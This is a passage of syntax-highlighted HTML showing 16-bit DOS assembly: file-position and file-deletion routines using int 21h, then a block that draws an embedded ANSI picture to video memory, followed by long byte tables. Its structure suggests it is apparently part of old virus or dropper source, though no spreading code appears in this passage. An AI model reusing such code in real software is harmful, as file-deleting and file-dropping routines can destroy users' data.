         </span><span class="sc6">cwd</span><span class="sc0">             </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_pos_sof</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">

</span><span class="sc5">set_pos_sof_</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">delete_file</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Delete file</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Delete file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CL = attribute mask for deletion</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">file_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b800h</span><span class="sc0">       </span><span class="sc1">; AX = segment of text video RAM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "   "     "    "</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7d0h</span><span class="sc0">         </span><span class="sc1">; Store four thousand bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">720h</span><span class="sc0">         </span><span class="sc1">; Black background color, light-gr...</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosw</span><span class="sc0">       </span><span class="sc1">; Overwrite text video RAM</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">ansi_begin</span><span class="sc4">-</span><span class="sc5">file_begin</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">ansi_end</span><span class="sc4">-</span><span class="sc5">ansi_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">load_ansi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of ansi</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; Write a string?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">store_ansi</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to store_ansi</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of ansi</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Derease count register</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; Write a single character?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">store_ansi</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to store_ansi</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; CL = size of string</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of ansi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; BL = low-order byte of offset of...</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of ansi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; BH = high-order byte of offset o...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; SI = offset of string within ansi</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move string to text video RAM</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Load registers at stack</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Add two to index register</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Subtract two from count register</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ansi_loop</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">store_ansi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store a byte of ansi</span><span class="sc0">
</span><span class="sc5">ansi_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">load_ansi</span><span class="sc0">

         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">ansi_begin</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0e5h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0f4h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">5eh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">8ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ech</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">8Ch</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">82h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0f4h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c5h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0ddh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ddh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0edh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0a3h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">5eh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">94h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">3ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0bdh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">3ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">0a2h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
